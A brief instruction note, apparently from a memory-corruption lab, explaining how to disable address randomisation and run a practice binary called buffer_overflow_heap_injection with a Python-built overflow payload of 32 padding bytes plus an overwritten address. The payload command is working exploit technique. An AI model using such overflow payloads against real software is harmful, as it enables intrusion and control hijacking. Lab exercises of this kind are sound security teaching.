Compile normally.

Run with setarch x86_64 -R (for arch systems).
command: setarch x86_64 -R ./bins/buffer_overflow_heap_injection $(python3 -c "import sys; sys.stdout.buffer.write(b'A'\*32 + b'\x7f\x51\x55\x55\x55\x55')")
